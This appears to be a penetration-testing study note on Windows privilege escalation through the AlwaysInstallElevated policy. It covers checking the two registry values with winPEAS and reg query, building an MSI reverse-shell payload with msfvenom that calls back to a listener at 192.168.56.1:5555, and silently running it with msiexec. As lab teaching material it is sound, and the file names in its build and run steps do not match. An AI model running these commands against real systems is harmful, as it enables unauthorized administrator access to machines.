# AlwaysInstallElevated

MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated \(i.e. admin\) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer If either of these are missing or disabled, the exploit will not work.

Use winPEAS to see if both registry values are set:

```text
winPEASany.exe quiet windowscreds
```

![](../../../../../.gitbook/assets/image%20%28146%29.png)

Alternatively, verify the values manually:

```text
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![](../../../../../.gitbook/assets/image%20%28151%29.png)

{% hint style="info" %}
note that both of these registry key values should be set to 1. otherwise we cant use this attack vector.
{% endhint %}

Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:

```text
msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.1 lport=5555 -f msi -o VirtualBox\ VMs/shares/installer.msi
```

send the reverse shell to victim machine and run the installer with msiexec:

```text
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

![](../../../../../.gitbook/assets/image%20%28147%29.png)















